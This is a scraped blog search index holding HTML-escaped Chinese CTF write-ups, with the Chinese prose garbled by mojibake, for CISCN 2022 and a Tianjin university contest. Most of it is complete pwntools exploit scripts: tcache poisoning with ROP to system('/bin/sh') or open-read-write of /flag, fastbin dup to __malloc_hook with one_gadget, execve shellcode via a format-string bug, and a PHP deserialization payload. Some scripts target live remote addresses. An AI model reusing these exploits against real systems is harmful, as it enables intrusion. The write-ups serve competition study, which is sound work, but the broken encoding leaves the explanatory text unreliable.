    io.sendlineafter(&amp;quot;Choice: &amp;quot;,&amp;quot;4&amp;quot;)
    io.sendlineafter(&amp;quot;Idx: \n&amp;quot;,str(n))
    io.sendlineafter(&amp;quot;Size: \n&amp;quot;,str(s))
    io.sendafter(&amp;quot;Content: \n&amp;quot;,cc)

# gdb.attach(io)
# pause()

add() #0
add() #1
delete(0)
show(0)
key=u64(io.recv(5).ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;key: &amp;quot;+hex(key))
heap_addr=key&amp;lt;&amp;lt;12
print(&amp;quot;heap_addr: &amp;quot;+hex(heap_addr))

delete(1)
payload=p64((heap_addr+0x10)^key)+p64(0)
edit(1,len(payload),payload)

add() #2
add() #3

payload=b&amp;quot;\x00&amp;quot;*0x4e+b&amp;quot;\x07&amp;quot;
edit(3,len(payload),payload)
delete(3)
payload=b&amp;quot;\x01&amp;quot;
edit(3,len(payload),payload)
show(3)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x71-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))


pop_rdi=leak_addr+next(libc.search(asm(&amp;quot;pop rdi;ret&amp;quot;)))
pop_rsi=leak_addr+next(libc.search(asm(&amp;quot;pop rsi;ret&amp;quot;)))
fake_pop_rdx=next(libc.search(asm(&amp;quot;pop rdx;ret&amp;quot;)))
print(&amp;quot;fake_pop_rdx: &amp;quot;+hex(fake_pop_rdx))
pop_rdx=leak_addr+0x0c7f32
pop_rax=leak_addr+next(libc.search(asm(&amp;quot;pop rax;ret&amp;quot;)))
ret=leak_addr+next(libc.search(asm(&amp;quot;ret&amp;quot;)))
str_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
open_a=leak_addr+libc.sym[b&amp;quot;open&amp;quot;]
read_a=leak_addr+libc.sym[b&amp;quot;read&amp;quot;]
write_a=leak_addr+libc.sym[b&amp;quot;write&amp;quot;]
environ=leak_addr+libc.sym[b&amp;quot;__environ&amp;quot;]


payload=b&amp;quot;/flag\x00\x00\x00&amp;quot;+b&amp;quot;\x00&amp;quot;*0x16+b&amp;quot;\x02&amp;quot;
edit(3,len(payload),payload)

delete(1)
payload=p64(environ^key)+p64(0)
edit(1,len(payload),payload)
add() #4
add() #5
show(5)
stack_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;stack_addr: &amp;quot;+hex(stack_addr))
ret_addr=stack_addr-0x138
print(&amp;quot;ret_addr: &amp;quot;+hex(ret_addr))


delete(4)
payload=p64((ret_addr)^key)+p64(0)
edit(4,len(payload),payload)



#open
orw=p64(0)*3+p64(pop_rdi)+p64(heap_addr+0x10)+p64(pop_rsi)+p64(0)+p64(open_a)
#read
orw+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(heap_addr+0x300)+p64(pop_rdx)+p64(0x50)+p64(read_a)
#write
orw+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(heap_addr+0x300)+p64(pop_rdx)+p64(0x50)+p64(write_a)



payload=b&amp;quot;/flag\x00\x00\x00&amp;quot;+b&amp;quot;\x00&amp;quot;*0x16+b&amp;quot;\x02&amp;quot;
edit(3,len(payload),payload)


add() #6
add() #7

# gdb.attach(io)
# pause()

edit(7,len(orw),orw)


io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">[CISCN 2022 åä¸œåŒ—]bigduck wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/VFTFpVn43/"" data-c="
          &lt;p&gt;åŠŸèƒ½é½å…¨çš„èœå•é¢˜ï¼Œä½†éœ€è¦æ³¨æ„çš„æ˜¯glibcç‰ˆæœ¬åœ¨2.34åˆ é™¤äº†å¸¸ç”¨çš„&lt;code&gt;__malloc_hook&lt;/code&gt;å’Œ&lt;code&gt;__free_hook&lt;/code&gt;ç­‰å¸¸ç”¨hookï¼Œæ„å‘³ç€åŠ«æŒhookæ‰“one_gadgetçš„æ–¹å¼å·²ä¸å¯è¡Œ&lt;br&gt;
æœ¬é¢˜é™åˆ¶äº†åˆ›å»ºå’Œé‡Šæ”¾å †å—çš„æ¬¡æ•°ï¼Œä½†å¹¶ä¸å½±å“æ‰“é¢˜çš„æ–¹æ³•&lt;br&gt;
æ­¤é¢˜æˆ‘ä»¬é€‰æ‹©æ³„éœ²libcååˆ©ç”¨&lt;code&gt;__environ&lt;/code&gt;æ³„éœ²æ ˆåœ°å€ç„¶ååŠ«æŒ&lt;code&gt;edit()&lt;/code&gt;çš„retåœ°å€æ‰“rop&lt;br&gt;
ä¸‹å›¾ä¸ºæ³„éœ²çš„æ ˆåœ°å€è·ç¦»retçš„åç§»ä¸º-0x150ï¼š&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1686835329136.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ä½†æ˜¯éœ€è¦å†å‡å»0x18æ‰èƒ½æ‰“é€šï¼Œæ‰€ä»¥éœ€è¦åˆ†é…åˆ°&lt;code&gt;stack_addr-0x168&lt;/code&gt;å¤„ï¼Œæ‰€ä»¥åç»­ropé“¾é¢å¤–éœ€è¦0x18çš„padding&lt;br&gt;
ä¸¤ç§æ–¹å¼ï¼š&lt;/p&gt;
&lt;h4 id=&#34;æ‰“tcache-structæ³„éœ²libc&#34;&gt;æ‰“tcache structæ³„éœ²libcï¼š&lt;/h4&gt;
&lt;p&gt;expï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28687)
io=process(&amp;quot;./pwn&amp;quot;)
elf=ELF(&amp;quot;./pwn&amp;quot;)
libc=ELF(&amp;quot;./libc.so&amp;quot;)

def add():
    io.sendlineafter(&amp;quot;Choice: &amp;quot;,&amp;quot;1&amp;quot;) #0x100
    
def delete(n):
    io.sendlineafter(&amp;quot;Choice: &amp;quot;,&amp;quot;2&amp;quot;)
    io.sendlineafter(&amp;quot;Idx: \n&amp;quot;,str(n))
    
def show(n):
    io.sendlineafter(&amp;quot;Choice: &amp;quot;,&amp;quot;3&amp;quot;)
    io.sendlineafter(&amp;quot;Idx: \n&amp;quot;,str(n))

def edit(n,s,cc):
    io.sendlineafter(&amp;quot;Choice: &amp;quot;,&amp;quot;4&amp;quot;)
    io.sendlineafter(&amp;quot;Idx: \n&amp;quot;,str(n))
    io.sendlineafter(&amp;quot;Size: \n&amp;quot;,str(s))
    io.sendafter(&amp;quot;Content: \n&amp;quot;,cc)


add() #0
add() #1
delete(0)
show(0)
key=u64(io.recv(5).ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;key: &amp;quot;,hex(key))
heap_addr=key&amp;lt;&amp;lt;12
print(&amp;quot;heap_addr: &amp;quot;,hex(heap_addr))

delete(1)
payload=p64((heap_addr+0x10)^key)+p64(0)
edit(1,len(payload),payload)
add()#2
add()#3
payload=b&amp;quot;\x00&amp;quot;*0x4e+b&amp;quot;\x07&amp;quot;
edit(3,len(payload),payload)

delete(3)
show(3)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))+0x74a0-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))

environ=leak_addr+libc.sym[b&amp;quot;__environ&amp;quot;]
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
str_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))
pop_rdi=leak_addr+next(libc.search(asm(&amp;quot;pop rdi;ret&amp;quot;)))
ret=leak_addr+next(libc.search(asm(&amp;quot;ret&amp;quot;)))

delete(2)
payload=p64(environ^key)+p64(0)
edit(2,len(payload),payload)

payload=b&amp;quot;\x00&amp;quot;*0x1e+b&amp;quot;\x02&amp;quot;
edit(3,len(payload),payload)

add()#4
add()#5
show(5)

stack_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;stack_addr: &amp;quot;+hex(stack_addr))
ret_addr=stack_addr-0x168
print(&amp;quot;ret_addr: &amp;quot;+hex(ret_addr))

delete(4)
payload=p64(ret_addr^key)+p64(0)
edit(4,len(payload),payload) 

payload=b&amp;quot;\x00&amp;quot;*0x1e+b&amp;quot;\x02&amp;quot;
edit(3,len(payload),payload)

add()#6
add()#7

gdb.attach(io)
pause()

payload=p64(0)*3+p64(pop_rdi)+p64(str_sh)+p64(sys_addr)
edit(7,len(payload),payload)


io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;é‡Šæ”¾tcachebin&#34;&gt;é‡Šæ”¾tcachebin :&lt;/h4&gt;
&lt;p&gt;expï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28687)
# io=process(&amp;quot;./pwn&amp;quot;)
elf=ELF(&amp;quot;./pwn&amp;quot;)
libc=ELF(&amp;quot;./libc.so&amp;quot;)

def add():
    io.sendlineafter(&amp;quot;Choice: &amp;quot;,&amp;quot;1&amp;quot;) #0x100
    
def delete(n):
    io.sendlineafter(&amp;quot;Choice: &amp;quot;,&amp;quot;2&amp;quot;)
    io.sendlineafter(&amp;quot;Idx: \n&amp;quot;,str(n))
    
def show(n):
    io.sendlineafter(&amp;quot;Choice: &amp;quot;,&amp;quot;3&amp;quot;)
    io.sendlineafter(&amp;quot;Idx: \n&amp;quot;,str(n))

def edit(n,s,cc):
    io.sendlineafter(&amp;quot;Choice: &amp;quot;,&amp;quot;4&amp;quot;)
    io.sendlineafter(&amp;quot;Idx: \n&amp;quot;,str(n))
    io.sendlineafter(&amp;quot;Size: \n&amp;quot;,str(s))
    io.sendafter(&amp;quot;Content: \n&amp;quot;,cc)

# gdb.attach(io)
# pause()

# edit(0,0x100,p64(count_addr))
# add() #0
# edit(0,0x100,b&amp;quot;\x07&amp;quot;*0x40)
for i in range(8):
    add()
    
add() #8

for i in range(8):
    delete(i)

show(7)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))+0x74a0-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))

one_gadget=[0xda861,0xda864,0xda867]
shell=one_gadget[0]+leak_addr
pop_rdi=leak_addr+next(libc.search(asm(&amp;quot;pop rdi;ret&amp;quot;)))
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
str_bin_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh\x00&amp;quot;))


show(0)
key=u64(io.recv(5).ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;key: &amp;quot;,hex(key))
heap_addr=key&amp;lt;&amp;lt;12
print(&amp;quot;heap_addr: &amp;quot;,hex(heap_addr))


environ=leak_addr+libc.sym[b&amp;quot;__environ&amp;quot;]
print(&amp;quot;environ: &amp;quot;,hex(environ))


for i in range(5):
    add() #9-13

payload=p64(environ^key)+p64(0)
edit(1,len(payload),payload)
add() #14
add() #15
show(15)
stack_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x168
print(&amp;quot;stack_addr: &amp;quot;,hex(stack_addr))

delete(9)
delete(10)

payload=p64(stack_addr^key)+p64(0)
edit(10,len(payload),payload)

add() #16
add() #17

payload=p64(0)*3+p64(pop_rdi)+p64(str_bin_sh)+p64(sys_addr)
edit(17,0x30,payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">[CISCN 2022 åä¸œåŒ—]duck wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/2kS7k1Mtb/"" data-c="
          &lt;h3 id=&#34;pwn&#34;&gt;PWNï¼š&lt;/h3&gt;
&lt;h4 id=&#34;skill&#34;&gt;skillï¼š&lt;/h4&gt;
&lt;p&gt;GLIBC 2.23-0ubuntu11.3&lt;br&gt;
èœå•ä¸‹é¢å°±åªæœ‰&lt;code&gt;add()&lt;/code&gt;æœ‰ç”¨ï¼Œå¯ä»¥ä¿®æ”¹bssæ®µä¸Šå†…å®¹ä»¥ç¬¦åˆåç»­&lt;code&gt;show()&lt;/code&gt;é‡Œé¢æ¯”è¾ƒå‡½æ•°&lt;br&gt;
åç»­å°±æ˜¯ret2libcæ¨¡æ¿é¢˜ï¼Œæ³¨æ„libcå°ç‰ˆæœ¬&lt;br&gt;
expï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;47.106.35.54&amp;quot;,46655)
# io=process(&amp;quot;./skill&amp;quot;)
elf=ELF(&amp;quot;./skill&amp;quot;)
libc=ELF(&amp;quot;libc.so&amp;quot;)

pop_rdi=0x400c83 
ret=0x400297

def add(cc):
    io.sendlineafter(b&amp;quot;exit\n&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Input your skill: \n&amp;quot;,cc)

payload=b&amp;quot;song&amp;quot;+b&amp;quot;\x00&amp;quot;*0xc+b&amp;quot;\x00&amp;quot;*4+b&amp;quot;jump&amp;quot;+b&amp;quot;\x00&amp;quot;*4+b&amp;quot;\x00&amp;quot;*0xc+b&amp;quot;rap\x00\x00\x00\x00\x00&amp;quot;+b&amp;quot;\x00&amp;quot;*0xc+b&amp;quot;NBA&amp;quot;
add(payload)

# gdb.attach(io)
# pause()

io.sendlineafter(b&amp;quot;exit\n&amp;quot;,b&amp;quot;4&amp;quot;)
payload=cyclic(0x18)+p64(pop_rdi)+p64(elf.got[b&amp;quot;puts&amp;quot;])+p64(elf.plt[b&amp;quot;puts&amp;quot;])+p64(0x4008b6)
io.sendline(payload)

leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;puts&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
str_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))

io.sendlineafter(b&amp;quot;exit\n&amp;quot;,b&amp;quot;4&amp;quot;)

io.recvuntil(b&amp;quot;music~\n&amp;quot;)

payload=cyclic(0x18)+p64(pop_rdi)+p64(str_sh)+p64(sys_addr)
io.sendline(payload)


io.interactive()

# Gadgets information
# ============================================================
# 0x0000000000400c7c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400c7e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400c80 : pop r14 ; pop r15 ; ret
# 0x0000000000400c82 : pop r15 ; ret
# 0x0000000000400c7b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400c7f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x0000000000400820 : pop rbp ; ret
# 0x0000000000400c83 : pop rdi ; ret
# 0x0000000000400c81 : pop rsi ; pop r15 ; ret
# 0x0000000000400c7d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400297 : ret
# 0x00000000004007a2 : ret 0x2018

# Unique gadgets found: 12
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;dragon_game&#34;&gt;dragon_game:&lt;/h4&gt;
&lt;p&gt;ç»•è¿‡ä¸€è¿ä¸²åˆ¤æ–­å‡½æ•°ï¼Œæœ€åè¿›å…¥åˆ°&lt;code&gt;sub_400A5D&lt;/code&gt;åœ¨rwxæ®µä¸Šå†™shellcode&lt;br&gt;
æœ‰é•¿åº¦é™åˆ¶ï¼Œå¯ä»¥ä¸Šexploit-dbæ‰¾&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;47.106.8.27&amp;quot;,46460)
# io=process(&amp;quot;./dragon_game&amp;quot;)
elf=ELF(&amp;quot;./dragon_game&amp;quot;)

io.recvuntil(b&amp;quot;is &amp;quot;)
leak_addr=int(io.recvuntil(&amp;quot;\n&amp;quot;)[:-1],16)
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))


io.recvuntil(b&amp;quot;t?:\n&amp;quot;)
io.sendline(b&amp;quot;east&amp;quot;)

io.recvuntil(b&amp;quot;address&#39;\n&amp;quot;)
io.sendline(str(leak_addr))

io.recvuntil(b&amp;quot;is:\n&amp;quot;)
payload=&amp;quot;%{}c%{}$n&amp;quot;.format(233,7)
io.sendline(payload)

shellcode=b&amp;quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&amp;quot;

io.recvuntil(b&amp;quot;LL\n&amp;quot;)
io.send(shellcode)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;consolidate&#34;&gt;consolidate:&lt;/h4&gt;
&lt;p&gt;GLIBC 2.23-0ubuntu11.3ï¼ˆæ³¨æ„å°ç‰ˆæœ¬ï¼Œå¦åˆ™one_gadgetæœ€åä¸é€š&lt;br&gt;
UAFï¼Œå¯ä»¥edit after free&lt;br&gt;
dup+ä¿®æ”¹fdä½å­—èŠ‚+fake chunkä¿®æ”¹sizeæ³„éœ²libc&lt;br&gt;
ç„¶åæœ€ååŠ«æŒmalloc_hookæ‰“one_gadget,æ³¨æ„reallocè°ƒæ ˆ&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;47.106.8.27&amp;quot;,48046)
# io=process(&amp;quot;./consolidate&amp;quot;)
libc=ELF(&amp;quot;libc-2.23.so&amp;quot;)
# elf=ELF(&amp;quot;./consolidate&amp;quot;)
# one_gadget=[0x45206,0x4525a,0xef9f4,0xf0897]
one_gadget=[0x45226,0x4527a,0xf03a4,0xf1247]

def add(cc):
    io.sendlineafter(b&amp;quot;choice\n&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendafter(b&amp;quot;content\n&amp;quot;,cc)

def delete(n):
    io.sendlineafter(b&amp;quot;choice\n&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;idx\n&amp;quot;,str(n))
    
def edit(n,cc):
    io.sendlineafter(b&amp;quot;choice\n&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;idx\n&amp;quot;,str(n))
    io.sendafter(b&amp;quot;content\n&amp;quot;,cc)

def show(n):
    io.sendlineafter(b&amp;quot;choice\n&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;idx\n&amp;quot;,str(n))

# gdb.attach(io)
# pause()

add(b&amp;quot;a&amp;quot;) #0
add(b&amp;quot;b&amp;quot;) #1
add(b&amp;quot;c&amp;quot;) #2
add(b&amp;quot;d&amp;quot;) #3
add(b&amp;quot;e&amp;quot;) #4

# edit(0,cyclic(0x60))

delete(0)
delete(1)
delete(0)
edit(0,b&amp;quot;\xa0&amp;quot;)
add(b&amp;quot;a&amp;quot;)
# delete(1)
edit(1,p64(0)*5+p64(0x71))
# delete(1)

add(cyclic(0x38)+p64(0xe1))
delete(2)
show(2)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x68-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
realloc=leak_addr+libc.sym[b&amp;quot;__libc_realloc&amp;quot;]
malloc_hook=leak_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
shell=leak_addr+one_gadget[1]

delete(0)
# delete(1)
# delete(0)

edit(0,p64(malloc_hook-0x23))
# add(b&amp;quot;a&amp;quot;)
add(b&amp;quot;a&amp;quot;)
add(cyclic(0xb)+p64(shell)+p64(realloc+0x10))


io.sendlineafter(b&amp;quot;choice\n&amp;quot;,b&amp;quot;1&amp;quot;)


io.interactive()

# 0x45226 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4527a execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf03a4 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1247 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;misc&#34;&gt;MISCï¼š&lt;/h3&gt;
&lt;h4 id=&#34;embarrass&#34;&gt;embarrassï¼š&lt;/h4&gt;
&lt;p&gt;æµé‡åŒ…strings ç›´æ¥è·‘å‡ºæ¥flag&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1686458594979.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;basic-type&#34;&gt;Basic type&lt;/h4&gt;
&lt;p&gt;ç›´æ¥ç”¨éšæ³¢é€æµå·¥å…·ç›´æ¥ä¸€æŠŠæ¢­å“ˆï¼Œå¯ä»¥å¾—åˆ°flagå›¾ç‰‡&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1686466842481.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h4 id=&#34;run&#34;&gt;run&lt;/h4&gt;
&lt;p&gt;æ‰“å¼€é™„ä»¶å‘ç°æ˜¯wordï¼Œç„¶åè¿›è¡Œforemoståˆ†ç¦»å‡ºæ¥è¿™äº›å›¾ç‰‡&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1686466850238.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;æŠŠexeé‚£ä¸ªæ‹–è¿›ida,å‘ç°æœ‰ä¸€ä¸²å¯†æ–‡&lt;/p&gt;
&lt;p&gt;ç„¶åå‡ºç°ä¸€ä¸ªå›¾ç‰‡ï¼Œå›¾ç‰‡å‘ç°æ˜¯ä¸¤ä¸ªå›¾å±‚ï¼Œç„¶åå‘ç°æœ‰ä¸€ä¸ªè§£å¯†é€»è¾‘&lt;/p&gt;
&lt;p&gt;ç„¶åå†™ä¸€ä¸ªè„šæœ¬å³å¯&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;str = &#39;njCp1HJBPLVTxcMhUHDPwE7mPW&#39;
flag = &#39;&#39;
for i in range(1, len(str)+1):
    if i % 2 == 0:
        flag += chr(ord(str[i-1]) + 1)
    else:
        flag += chr(ord(str[i-1]) - 1)
print(flag)
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;web&#34;&gt;web&lt;/h3&gt;
&lt;h4 id=&#34;missing_php&#34;&gt;missing_php&lt;/h4&gt;
&lt;p&gt;è¿™é¢˜ä¸Šæ‰«æ  æ‰«å‡º/.index.php.swpè¿™ä¸ªç›®å½•&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1686466863431.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;ç„¶åç›´æ¥è®¿é—®  /fl4444444gå°±å‡ºflagäº†&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1686466869831.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h4 id=&#34;åºåˆ—åŒ–&#34;&gt;åºåˆ—åŒ–&lt;/h4&gt;
&lt;p&gt;æºç é‡Œé¢æœ‰ä¸€ä¸ªè¿™ä¸ª&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1686466879636.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;ç„¶åç”¨BPæŠ“åŒ…å‘ç°cookieé‡Œé¢æœ‰ä¸¤ä¸ªå€¼,æŠŠlistè¿›è¡Œurldecodeå‘ç°ä¼ å…¥çš„å‚æ•°éƒ½è¢«å½“åšæ•°ç»„åºåˆ—åŒ–äº†&lt;/p&gt;
&lt;p&gt;ç„¶åæ ¹æ®è¿™ä¸ªæ„é€ ä¸€ä¸ªPOCè„šæœ¬&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
$a=[];
Class whatthefuck{
    public $source;
    public function __construct()
    {
        $this-&amp;gt;source = &amp;quot;flag.php&amp;quot;;
    }
	public function __toString()
	{
		return highlight_file($this-&amp;gt;source,true);
	}
}
$a[0]=new whatthefuck;
echo serialize($a);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ç„¶åè·‘å‡ºpayload(a:1:{i:0;O:11:&amp;quot;whatthefuck&amp;quot;:1:{s:6:&amp;quot;source&amp;quot;;s:8:&amp;quot;flag.php&amp;quot;;}})è¿›è¡Œä¸€æ¬¡urlencodeç¼–ç ,æ”¹cookieçš„listå€¼å³å¯&lt;/p&gt;
&lt;h2 id=&#34;reverse&#34;&gt;Reverse&lt;/h2&gt;
&lt;h3 id=&#34;easycrack&#34;&gt;easyCrack&lt;/h3&gt;
&lt;p&gt;å°†exeæ–‡ä»¶è„±æœºè„±å£³æœºï¼Œä¸€é”®è„±å£³&lt;/p&gt;
&lt;p&gt;ç„¶åå°†è„±å¥½çš„exeè„±æœºidaé‡Œé¢ï¼Œç„¶åæ‰¾åˆ°ä¸»å‡½æ•°å‘ç°åŠ å¯†é€»è¾‘&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;6&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1686466895944.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;ç„¶ååœ¨str2æ‰¾åˆ°å¯†æ–‡&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;7&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1686466904748.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;ç„¶åå†™ä¸€ä¸ªè„šæœ¬å°±okäº†&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;ans=&amp;quot;hboiuFk|kGocs&amp;quot;
flag=&amp;quot;&amp;quot;
for i in range(12,-1,-1):
    s=ord(ans[i])
    s^=14
    flag+=chr(s)
print(flag[::-1])
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;crpyto&#34;&gt;Crpyto&lt;/h3&gt;
&lt;h4 id=&#34;xor&#34;&gt;xor&lt;/h4&gt;
&lt;p&gt;è¿›è¡Œä¸€æ¬¡base64è§£ç ï¼Œç„¶åè¿›è¡Œäº¦æˆ–çˆ†ç ´ç›´æ¥å‡ºflagäº†&lt;/p&gt;
">å¤©æ´¥å¸‚å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç½‘ç»œæ”»é˜²å¤§èµ›ã€CTFè§£é¢˜èµ›ã€‘ wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/jHcQ-mMeR/"" data-c="
          &lt;p&gt;è¿‡å»çš„SWPUçš„é¢˜ç›®æ¬å‡ºæ¥åšä¸€ä¸‹&lt;/p&gt;
&lt;h4 id=&#34;tnote&#34;&gt;tnote:&lt;/h4&gt;
&lt;p&gt;off by oneå †é‡å æ³„éœ²å †åœ°å€&lt;br&gt;
ç„¶ååŠ«æŒåˆ°tcache structï¼ˆheap_base+0x10å¤„ä¿®æ”¹countsæ³„éœ²libcç„¶åæ­£å¸¸æ‰“free_hook&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
